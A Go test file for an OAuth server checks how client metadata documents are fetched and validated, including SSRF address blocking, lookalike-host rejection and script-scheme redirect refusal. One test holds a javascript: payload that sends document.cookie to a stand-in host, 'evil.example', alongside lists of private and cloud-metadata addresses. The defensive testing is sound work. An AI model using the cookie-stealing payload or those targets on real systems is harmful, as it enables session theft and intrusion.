package server

import (
	"context"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// Spec 027 phase 2 (T017): Client ID Metadata Documents, iss on every
// authorization response, and the refusals that keep a fetch a stranger can
// cause from being anything more than a read of one small public document.

const cimdURL = "https://client.example.test/oauth/client.json"
const cimdRedirect = "https://client.example.test/callback"

// cimdHost serves documents by URL through the server's metadata transport,
// so a test controls what "https://client.example.test/…" answers without a
// network. fetches counts what was asked for.
type cimdHost struct {
	docs    map[string]func(w http.ResponseWriter, r *http.Request)
	fetches atomic.Int32
}

func (h *cimdHost) RoundTrip(r *http.Request) (*http.Response, error) {
	h.fetches.Add(1)
	serve, ok := h.docs[r.URL.String()]
	if !ok {
		serve = func(w http.ResponseWriter, _ *http.Request) { http.NotFound(w, nil) }
	}
	rec := httptest.NewRecorder()
	done := make(chan struct{})
	go func() { serve(rec, r); close(done) }()
	select {
	case <-done:
	case <-r.Context().Done():
		return nil, r.Context().Err()
	}
	res := rec.Result()
	res.Request = r
	return res, nil
}

func cimdDoc(fields map[string]any) func(w http.ResponseWriter, r *http.Request) {
	return func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(fields)
	}
}

func goodCIMD() map[string]any {
	return map[string]any{
		"client_id": cimdURL, "client_name": "Example Agent",
		"redirect_uris": []string{cimdRedirect}, "token_endpoint_auth_method": "none",
	}
}

func cimdServer(t *testing.T, doc func(w http.ResponseWriter, r *http.Request)) (*Server, *cimdHost) {
	t.Helper()
	s := testServer(t)
	h := &cimdHost{docs: map[string]func(http.ResponseWriter, *http.Request){cimdURL: doc}}
	s.clientMetadataTransport = h
	return s, h
}

// authorize starts an authorization the way a client's browser does.
func authorize(s *Server, cookie, clientID, redirect string, extra url.Values) *httptest.ResponseRecorder {
	q := url.Values{"client_id": {clientID}, "redirect_uri": {redirect}, "response_type": {"code"},
		"code_challenge": {pkce("verifier-0123456789-0123456789-0123456789")}, "code_challenge_method": {"S256"}, "state": {"st"}}
	for k, v := range extra {
		q[k] = v
	}
	r := httptest.NewRequest("GET", "/oauth/authorize?"+q.Encode(), nil)
	if cookie != "" {
		r.Header.Set("Cookie", cookie)
	}
	rec := httptest.NewRecorder()
	s.ServeHTTP(rec, r)
	return rec
}

func storedClients(t *testing.T, s *Server, id string) int {
	t.Helper()
	var n int
	s.db.QueryRow(`SELECT COUNT(*) FROM oauth_clients WHERE id = ?`, id).Scan(&n)
	return n
}

// US5: a client named by its document's URL signs in end to end, with no
// registration, and the consent screen is told where its name comes from.
func TestAMetadataURLClientSignsInWithoutRegistering(t *testing.T) {
	s, _ := cimdServer(t, cimdDoc(goodCIMD()))
	uid, cookie := signedIn(t, s, "cimd@example.test")
	ws := s.firstWorkspaceOf(t, uid)

	rec := authorize(s, cookie, cimdURL, cimdRedirect, nil)
	if rec.Code != http.StatusFound || !strings.HasPrefix(rec.Header().Get("Location"), "/oauth/consent?") {
		t.Fatalf("authorize: %d %s %s", rec.Code, rec.Header().Get("Location"), rec.Body.String())
	}
	var name, fetched string
	s.db.QueryRow(`SELECT name, metadata_fetched_at FROM oauth_clients WHERE id = ?`, cimdURL).Scan(&name, &fetched)
	if name != "Example Agent" || fetched == "" {
		t.Fatalf("stored client: %q fetched %q", name, fetched)
	}

	r := httptest.NewRequest("GET", "/api/oauth/request?client_id="+url.QueryEscape(cimdURL)+"&redirect_uri="+url.QueryEscape(cimdRedirect), nil)
	r.Header.Set("Cookie", cookie)
	info := httptest.NewRecorder()
	s.ServeHTTP(info, r)
	var got map[string]any
	json.Unmarshal(info.Body.Bytes(), &got)
	if got["clientHost"] != "client.example.test" || got["clientName"] != "Example Agent" || got["issuer"] != "http://example.com" {
		t.Errorf("request info: %d %v", info.Code, got)
	}

	verifier := "verifier-0123456789-0123456789-0123456789"
	code := approve(t, s, cookie, cimdURL, cimdRedirect, pkce(verifier), "write", []string{ws})
	status, out := tokenCall(s, url.Values{"grant_type": {"authorization_code"}, "code": {code},
		"client_id": {cimdURL}, "redirect_uri": {cimdRedirect}, "code_verifier": {verifier}})
	if status != http.StatusOK || out["access_token"] == "" {
		t.Fatalf("token: %d %v", status, out)
	}
	// The activity log names where the client came from, not only its name.
	var detail string
	s.db.QueryRow(`SELECT detail FROM audit_log WHERE action = 'oauth_consent' ORDER BY id DESC LIMIT 1`).Scan(&detail)
	if !strings.Contains(detail, "Example Agent from client.example.test") {
		t.Errorf("audit detail %q", detail)
	}
}

// The authorization server says what it supports, so a 2026-07-28 client
// picks a metadata document over registration and checks iss.
func TestMetadataAdvertisesDocumentsAndIss(t *testing.T) {
	s := testServer(t)
	rec := httptest.NewRecorder()
	s.ServeHTTP(rec, httptest.NewRequest("GET", "/.well-known/oauth-authorization-server", nil))
	var meta map[string]any
	json.Unmarshal(rec.Body.Bytes(), &meta)
	if meta["client_id_metadata_document_supported"] != true || meta["authorization_response_iss_parameter_supported"] != true {
		t.Errorf("metadata: %v", meta)
	}
	if meta["registration_endpoint"] == nil {
		t.Error("registration was dropped; older clients still need it")
	}
}

// Each document that fails a check stops the authorization, unredirected,
// and leaves nothing stored: the draft forbids caching an invalid document,
// and a stored one would be trusted at the token endpoint.
func TestABadMetadataDocumentIsRefusedAndNotStored(t *testing.T) {
	big := goodCIMD()
	big["client_uri"] = strings.Repeat("x", clientMetadataMaxBytes)
	type bad struct {
		doc    func(w http.ResponseWriter, r *http.Request)
		reason string // what the refusal says: the check that caught it
	}
	for name, c := range map[string]bad{
		"another client_id":     {cimdDoc(merge(goodCIMD(), map[string]any{"client_id": "https://elsewhere.example.test/client.json"})), "not the address it is served at"},
		"no client_name":        {cimdDoc(merge(goodCIMD(), map[string]any{"client_name": "  "})), "no client_name"},
		"no redirect_uris":      {cimdDoc(merge(goodCIMD(), map[string]any{"redirect_uris": []string{}})), "no redirect_uris"},
		"a plain-http redirect": {cimdDoc(merge(goodCIMD(), map[string]any{"redirect_uris": []string{"http://client.example.test/cb"}})), "only allowed for loopback"},
		"a client_secret":       {cimdDoc(merge(goodCIMD(), map[string]any{"client_secret": "s3cret"})), "must not carry a client_secret"},
		"a secret auth method":  {cimdDoc(merge(goodCIMD(), map[string]any{"token_endpoint_auth_method": "client_secret_post"})), "is not supported"},
		"larger than 5 KB":      {cimdDoc(big), "larger than 5 KB"},
		"not JSON":              {func(w http.ResponseWriter, _ *http.Request) { io.WriteString(w, "<html>hello</html>") }, "not a JSON object"},
		"a 404":                 {func(w http.ResponseWriter, _ *http.Request) { http.NotFound(w, nil) }, "answered 404"},
		"a redirect": {func(w http.ResponseWriter, r *http.Request) {
			http.Redirect(w, r, "https://elsewhere.example.test/client.json", http.StatusFound)
		}, "without a redirect"},
	} {
		doc := c.doc
		t.Run(name, func(t *testing.T) {
			s, h := cimdServer(t, doc)
			h.docs["https://elsewhere.example.test/client.json"] = cimdDoc(goodCIMD())
			rec := authorize(s, "", cimdURL, cimdRedirect, nil)
			if rec.Code != http.StatusBadRequest || rec.Header().Get("Location") != "" || !strings.Contains(rec.Body.String(), "invalid_client") ||
				!strings.Contains(rec.Body.String(), c.reason) {
				t.Errorf("want a refusal saying %q: %d %q %s", c.reason, rec.Code, rec.Header().Get("Location"), rec.Body.String())
			}
			if n := storedClients(t, s, cimdURL); n != 0 {
				t.Errorf("an invalid document was stored")
			}
		})
	}
}

func merge(a, b map[string]any) map[string]any {
	for k, v := range b {
		a[k] = v
	}
	return a
}

// A redirect address the document does not list is refused like one a
// registered client did not register, before anything is redirected.
func TestAMetadataClientCannotUseAnUnlistedRedirect(t *testing.T) {
	s, _ := cimdServer(t, cimdDoc(goodCIMD()))
	rec := authorize(s, "", cimdURL, "https://attacker.example.test/steal", nil)
	if rec.Code != http.StatusBadRequest || rec.Header().Get("Location") != "" || !strings.Contains(rec.Body.String(), "invalid_redirect_uri") {
		t.Errorf("%d %q %s", rec.Code, rec.Header().Get("Location"), rec.Body.String())
	}
}

// A slow document is given up on after the time limit, not waited for.
func TestASlowMetadataDocumentTimesOut(t *testing.T) {
	old := clientMetadataTimeout
	clientMetadataTimeout = 200 * time.Millisecond
	defer func() { clientMetadataTimeout = old }()
	release := make(chan struct{})
	defer close(release)
	s, _ := cimdServer(t, func(w http.ResponseWriter, _ *http.Request) { <-release })
	start := time.Now()
	rec := authorize(s, "", cimdURL, cimdRedirect, nil)
	if rec.Code != http.StatusBadRequest || time.Since(start) > 3*time.Second {
		t.Errorf("%d after %v: %s", rec.Code, time.Since(start), rec.Body.String())
	}
}

// The real transport (no test override) reaches public addresses only, and
// the admin's switch for private imports does not open it: anyone can send a
// client_id to /oauth/authorize without signing in. Each id is refused at the
// dial, by the address check, before any connection is made.
func TestAMetadataURLOnAPrivateAddressIsNeverFetched(t *testing.T) {
	s := testServer(t)
	s.clientMetadataRate = newRateLimiter(1e9, 1e9) // 18 tries from one address
	defer func() { allowPrivateImport = false }()
	for _, id := range []string{
		"https://127.0.0.1/client.json",
		"https://localhost/client.json",
		"https://[::1]/client.json",
		"https://10.0.0.8/client.json",
		"https://169.254.169.254/client.json",
		"https://100.64.0.1/client.json",         // shared carrier space
		"https://[64:ff9b::7f00:1]/client.json",  // 127.0.0.1 through NAT64
		"https://[2002:7f00:1::1]/client.json",   // 127.0.0.1 through 6to4
		"https://[::ffff:127.0.0.1]/client.json", // IPv4-mapped
	} {
		for _, allow := range []bool{false, true} {
			allowPrivateImport = allow
			rec := authorize(s, "", id, cimdRedirect, nil)
			if rec.Code != http.StatusBadRequest || !strings.Contains(rec.Body.String(), "only public addresses") {
				t.Errorf("%s, private imports allowed=%v: %d %s", id, allow, rec.Code, rec.Body.String())
			}
		}
	}
}

// notPublicIP covers what the old import guard (localIP) missed. Since
// #1129 blockedIP refuses all of it too, unless the operator opened imports
// up with NIGARI_IMPORT_ALLOW_PRIVATE.
func TestNotPublicIPCoversWhatTheImportGuardMisses(t *testing.T) {
	for _, a := range []string{"100.64.1.1", "0.1.2.3", "198.18.0.1", "240.0.0.1", "192.0.0.8",
		"64:ff9b::7f00:1", "64:ff9b::a00:1", "2002:7f00:1::", "2002:c0a8:101::", "fec0::1", "64:ff9b:1::1",
		"::7f00:1", "::a00:1", "::ffff:0:7f00:1", "2001:0:4136:e378::1", "100::1"} {
		if !notPublicIP(net.ParseIP(a)) {
			t.Errorf("%s counted as public", a)
		}
		if !allowPrivateImport && !blockedIP(net.ParseIP(a)) {
			t.Errorf("%s reaches imports and webhooks (#1129)", a)
		}
	}
	for _, a := range []string{"8.8.8.8", "64:ff9b::808:808", "2002:808:808::", "2606:4700::1", "1.1.1.1"} {
		if notPublicIP(net.ParseIP(a)) {
			t.Errorf("%s counted as not public", a)
		}
	}
	for _, a := range []string{"8.8.8.8", "64:ff9b::808:808", "2002:808:808::"} {
		if blockedIP(net.ParseIP(a)) {
			t.Errorf("%s is public and must reach imports and webhooks", a)
		}
	}
}

// The refusal for an import or a webhook says how the operator opens it up,
// so someone importing from a Tailscale machine sees what to set; a client
// metadata fetch, which has no switch, does not offer one (#1129).
func TestRefusalNamesTheSwitchOnlyWhereThereIsOne(t *testing.T) {
	if allowPrivateImport {
		t.Skip("NIGARI_IMPORT_ALLOW_PRIVATE is set")
	}
	_, err := safeDial(context.Background(), "tcp", "100.64.1.1:80")
	if err == nil || !strings.Contains(err.Error(), "NIGARI_IMPORT_ALLOW_PRIVATE=1") {
		t.Errorf("import refusal: %v", err)
	}
	_, err = publicDial(context.Background(), "tcp", "100.64.1.1:443")
	if err == nil || strings.Contains(err.Error(), "NIGARI_IMPORT_ALLOW_PRIVATE") {
		t.Errorf("metadata refusal: %v", err)
	}
}

// A link straight to the consent screen skips /oauth/authorize, which is
// where a document is read again. The screen and the approval refuse a
// document older than a day, so a redirect address the client has since
// dropped is not honoured (security review, phase 2).
func TestAStaleMetadataClientCannotBeApproved(t *testing.T) {
	s, _ := cimdServer(t, cimdDoc(goodCIMD()))
	uid, cookie := signedIn(t, s, "stale@example.test")
	ws := s.firstWorkspaceOf(t, uid)
	authorize(s, cookie, cimdURL, cimdRedirect, nil)
	info := func() int {
		r := httptest.NewRequest("GET", "/api/oauth/request?client_id="+url.QueryEscape(cimdURL)+"&redirect_uri="+url.QueryEscape(cimdRedirect), nil)
		r.Header.Set("Cookie", cookie)
		rec := httptest.NewRecorder()
		s.ServeHTTP(rec, r)
		return rec.Code
	}
	if info() != 200 {
		t.Fatal("a fresh document was refused")
	}
	s.db.Exec(`UPDATE oauth_clients SET metadata_fetched_at = ? WHERE id = ?`,
		time.Now().UTC().Add(-25*time.Hour).Format(time.RFC3339Nano), cimdURL)
	if code := info(); code != 400 {
		t.Errorf("request info for a stale document: %d", code)
	}
	payload, _ := json.Marshal(map[string]any{"clientId": cimdURL, "redirectUri": cimdRedirect,
		"codeChallenge": pkce("v-0123456789-0123456789-0123456789-0123"), "codeChallengeMethod": "S256",
		"scope": "read", "workspaces": []string{ws}})
	r := httptest.NewRequest("POST", "/api/oauth/approve", strings.NewReader(string(payload)))
	r.Header.Set("Cookie", cookie)
	r.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	s.ServeHTTP(rec, r)
	if rec.Code != 400 || !strings.Contains(rec.Body.String(), "client_metadata_stale") {
		t.Errorf("approve on a stale document: %d %s", rec.Code, rec.Body.String())
	}
	// A registered client has no document and is never stale.
	if s.clientMetadataStale(oauthClientFixture(t, s, "https://claude.ai/cb")) {
		t.Error("a registered client counted as stale")
	}
}

// One machine with an IPv6 /64 gets one bucket, not one per address.
func TestRateKeyGroupsAnIPv6Network(t *testing.T) {
	a, b := rateKeyForAddress("2001:db8:1:2::1"), rateKeyForAddress("2001:db8:1:2:ffff::9")
	if a != b || a == rateKeyForAddress("2001:db8:1:3::1") || rateKeyForAddress("203.0.113.9") != "203.0.113.9" {
		t.Errorf("keys: %q %q", a, b)
	}
}

// A document is read once and reused for 24 hours; after that the next
// authorization reads it again, and one that no longer passes stops the
// authorization rather than falling back to the stored copy.
func TestAMetadataDocumentIsReadAgainAfterADay(t *testing.T) {
	name := "Example Agent"
	s, h := cimdServer(t, nil)
	h.docs[cimdURL] = func(w http.ResponseWriter, r *http.Request) {
		cimdDoc(merge(goodCIMD(), map[string]any{"client_name": name}))(w, r)
	}
	authorize(s, "", cimdURL, cimdRedirect, nil)
	authorize(s, "", cimdURL, cimdRedirect, nil)
	if n := h.fetches.Load(); n != 1 {
		t.Fatalf("fetched %d times within a day, want 1", n)
	}
	s.db.Exec(`UPDATE oauth_clients SET metadata_fetched_at = ? WHERE id = ?`,
		time.Now().UTC().Add(-25*time.Hour).Format(time.RFC3339Nano), cimdURL)
	name = "Renamed Agent"
	authorize(s, "", cimdURL, cimdRedirect, nil)
	var stored string
	s.db.QueryRow(`SELECT name FROM oauth_clients WHERE id = ?`, cimdURL).Scan(&stored)
	if h.fetches.Load() != 2 || stored != "Renamed Agent" {
		t.Errorf("after a day: %d fetches, name %q", h.fetches.Load(), stored)
	}
	s.db.Exec(`UPDATE oauth_clients SET metadata_fetched_at = ? WHERE id = ?`,
		time.Now().UTC().Add(-25*time.Hour).Format(time.RFC3339Nano), cimdURL)
	h.docs[cimdURL] = func(w http.ResponseWriter, _ *http.Request) { http.NotFound(w, nil) }
	if rec := authorize(s, "", cimdURL, cimdRedirect, nil); rec.Code != http.StatusBadRequest {
		t.Errorf("a document that is gone still authorized: %d", rec.Code)
	}
}

// Fetches are limited per address, so nigari cannot be used as anyone's
// fetching proxy.
func TestMetadataFetchesAreRateLimited(t *testing.T) {
	s, h := cimdServer(t, cimdDoc(goodCIMD()))
	s.clientMetadataRate = newRateLimiter(0, 1)
	other := "https://client.example.test/oauth/other.json"
	h.docs[other] = cimdDoc(merge(goodCIMD(), map[string]any{"client_id": other}))
	authorize(s, "", cimdURL, cimdRedirect, nil)
	rec := authorize(s, "", other, cimdRedirect, nil)
	if rec.Code != http.StatusTooManyRequests || h.fetches.Load() != 1 {
		t.Errorf("second fetch: %d, %d fetches", rec.Code, h.fetches.Load())
	}
	// A client already read is not a fetch, and passes the limit.
	if rec := authorize(s, "", cimdURL, cimdRedirect, nil); rec.Code != http.StatusFound {
		t.Errorf("a stored client was held to the fetch limit: %d", rec.Code)
	}
}

// Only well-formed https URLs are taken for documents (the draft's section
// 3); anything else is looked up as a registered id, and is unknown.
func TestWhichClientIDsAreMetadataURLs(t *testing.T) {
	for id, want := range map[string]bool{
		cimdURL:                                   true,
		"https://client.example.test/a?x=1":       false,
		"https://client.example.test:443/c.json":  true,
		"https://client.example.test:8443/c.json": false,
		"https://xn--nthropic-3ag.com/c.json":     true,
		"https://аnthropic.com/c.json":            false,
		"http://client.example.test/client.json":  false,
		"https://client.example.test":             false,
		"https://client.example.test/":            false,
		"https://u:p@client.example.test/c.json":  false,
		"https://client.example.test/c.json#x":    false,
		"https://client.example.test/a/../c":      false,
		"https://client.example.test/./c":         false,
		"nigari-0123456789abcdef01234567":         false,
	} {
		if got := isClientMetadataURL(id); got != want {
			t.Errorf("%q: %v, want %v", id, got, want)
		}
	}
}

// RFC 9207: every redirect /oauth/authorize sends back carries iss, the
// issuer the metadata names, so a client talking to two servers cannot be
// handed one's code as the other's.
func TestAuthorizationErrorsCarryIss(t *testing.T) {
	s := testServer(t)
	redirect := "https://claude.ai/api/mcp/auth_callback"
	client := oauthClientFixture(t, s, redirect)
	for name, extra := range map[string]url.Values{
		"unsupported response type": {"response_type": {"token"}},
		"no PKCE":                   {"code_challenge": {""}},
	} {
		rec := authorize(s, "", client, redirect, extra)
		loc, _ := url.Parse(rec.Header().Get("Location"))
		if rec.Code != http.StatusFound || loc == nil || loc.Query().Get("error") == "" || loc.Query().Get("iss") != "http://example.com" {
			t.Errorf("%s: %d %s", name, rec.Code, rec.Header().Get("Location"))
		}
	}
	rec := httptest.NewRecorder()
	s.ServeHTTP(rec, httptest.NewRequest("GET", "/.well-known/oauth-authorization-server", nil))
	var meta map[string]any
	json.Unmarshal(rec.Body.Bytes(), &meta)
	if meta["issuer"] != "http://example.com" {
		t.Errorf("iss and the metadata's issuer differ: %v", meta["issuer"])
	}
}

// Registration (deprecated by 2026-07-28, kept for older clients) still
// works beside metadata documents, and a registered id is never fetched.
func TestRegistrationStillWorksBesideMetadataDocuments(t *testing.T) {
	s, h := cimdServer(t, cimdDoc(goodCIMD()))
	redirect := "https://claude.ai/api/mcp/auth_callback"
	client := oauthClientFixture(t, s, redirect)
	if rec := authorize(s, "", client, redirect, nil); rec.Code != http.StatusFound {
		t.Errorf("a registered client: %d %s", rec.Code, rec.Body.String())
	}
	if h.fetches.Load() != 0 {
		t.Errorf("a registered id was fetched")
	}
}

// A metadata client nobody uses is forgotten after 30 days; one with a grant
// stays however old its document is.
func TestUnusedMetadataClientsAreSwept(t *testing.T) {
	s := testServer(t)
	uid, _ := signedIn(t, s, "sweep@example.test")
	old := time.Now().UTC().Add(-31 * 24 * time.Hour).Format(time.RFC3339Nano)
	for _, id := range []string{"https://a.example.test/c.json", "https://b.example.test/c.json"} {
		s.db.Exec(`INSERT INTO oauth_clients (id, name, redirect_uris, created_at, metadata_fetched_at) VALUES (?, 'x', '[]', ?, ?)`, id, old, old)
	}
	s.db.Exec(`INSERT INTO oauth_grants (id, user_id, client_id, refresh_hash, scope, workspaces, created_at) VALUES (?, ?, 'https://b.example.test/c.json', ?, 'read', '', ?)`,
		newID(), uid, tokenHash(newID()), now())
	registered := oauthClientFixture(t, s, "https://claude.ai/cb")
	s.db.Exec(`UPDATE oauth_clients SET created_at = ? WHERE id = ?`, old, registered)
	s.sweepOAuth()
	if storedClients(t, s, "https://a.example.test/c.json") != 0 {
		t.Error("an unused metadata client stayed")
	}
	if storedClients(t, s, "https://b.example.test/c.json") != 1 || storedClients(t, s, registered) != 1 {
		t.Error("a client in use, or a registered one, was swept")
	}
}

// #1130: a javascript: return address ran as script on nigari's page when
// the consent screen sent the browser there (Deny took it straight from the
// link). The server now refuses script schemes wherever a return address is
// used, and the consent screen's info confirms the address it is given.
func TestAScriptRedirectIsRefusedEverywhere(t *testing.T) {
	s, h := cimdServer(t, cimdDoc(goodCIMD()))
	_, cookie := signedIn(t, s, "xss@example.test")
	evil := "javascript:fetch('//evil.example/'+document.cookie)//"

	// Registration and a metadata document refuse it.
	rec := httptest.NewRecorder()
	s.ServeHTTP(rec, httptest.NewRequest("POST", "/oauth/register", strings.NewReader(`{"client_name":"x","redirect_uris":["`+evil+`"]}`)))
	if rec.Code != 400 {
		t.Errorf("registration took a javascript: address: %d", rec.Code)
	}
	for _, scheme := range []string{"javascript:alert(1)", "data:text/html,x", "vbscript:x", "JavaScript:alert(1)"} {
		if validRedirectURI(scheme) == nil {
			t.Errorf("%s is a valid redirect_uri", scheme)
		}
	}
	if validRedirectURI("com.example.app:/oauth/cb") != nil {
		t.Error("a native app's custom scheme is refused")
	}
	other := "https://client.example.test/oauth/evil.json"
	h.docs[other] = cimdDoc(merge(goodCIMD(), map[string]any{"client_id": other, "redirect_uris": []string{evil}}))
	if rec := authorize(s, "", other, evil, nil); rec.Code != 400 || !strings.Contains(rec.Body.String(), "javascript") {
		t.Errorf("a document with a javascript: address: %d %s", rec.Code, rec.Body.String())
	}

	// A client stored before the fix, holding one, cannot use it at any door.
	s.db.Exec(`INSERT INTO oauth_clients (id, name, redirect_uris, created_at) VALUES ('old-client', 'Old', ?, ?)`,
		`["`+strings.ReplaceAll(evil, `'`, `'`)+`"]`, now())
	if rec := authorize(s, cookie, "old-client", evil, nil); rec.Code != 400 {
		t.Errorf("authorize with a stored javascript: address: %d %s", rec.Code, rec.Header().Get("Location"))
	}
	infoCode := func(client, redirect string) int {
		r := httptest.NewRequest("GET", "/api/oauth/request?client_id="+url.QueryEscape(client)+"&redirect_uri="+url.QueryEscape(redirect), nil)
		r.Header.Set("Cookie", cookie)
		rec := httptest.NewRecorder()
		s.ServeHTTP(rec, r)
		return rec.Code
	}
	if code := infoCode("old-client", evil); code != 400 {
		t.Errorf("request info confirmed a javascript: address: %d", code)
	}
	// The consent info confirms only the client's own addresses: a link that
	// names another, as Deny used to follow, is refused before the screen
	// shows anything.
	authorize(s, cookie, cimdURL, cimdRedirect, nil)
	if code := infoCode(cimdURL, "https://attacker.example.test/cb"); code != 400 {
		t.Errorf("request info with an unregistered address: %d", code)
	}
	if code := infoCode(cimdURL, cimdRedirect); code != 200 {
		t.Errorf("request info with the client's own address: %d", code)
	}
}

// A row stored under the branch's first, looser rule for ids (a query, a
// port, a lookalike host) is not taken for a registered client: it is stale
// for good, at authorize, at the consent screen and at the approval (second
// security review).
func TestAMetadataClientStoredUnderOldRulesIsNotTrusted(t *testing.T) {
	s := testServer(t)
	_, cookie := signedIn(t, s, "oldrules@example.test")
	for _, id := range []string{"https://client.example.test/c.json?v=1", "https://client.example.test:8443/c.json", "https://аnthropic.com/c.json"} {
		s.db.Exec(`INSERT INTO oauth_clients (id, name, redirect_uris, created_at, metadata_fetched_at) VALUES (?, 'Old', ?, ?, ?)`,
			id, `["`+cimdRedirect+`"]`, now(), now())
		if !s.clientMetadataStale(id) {
			t.Errorf("%s counts as fresh", id)
		}
		if rec := authorize(s, cookie, id, cimdRedirect, nil); rec.Code != 400 {
			t.Errorf("%s: authorize %d %s", id, rec.Code, rec.Header().Get("Location"))
		}
	}
	if s.clientMetadataStale(oauthClientFixture(t, s, "https://claude.ai/cb")) {
		t.Error("a registered client counts as stale")
	}
}
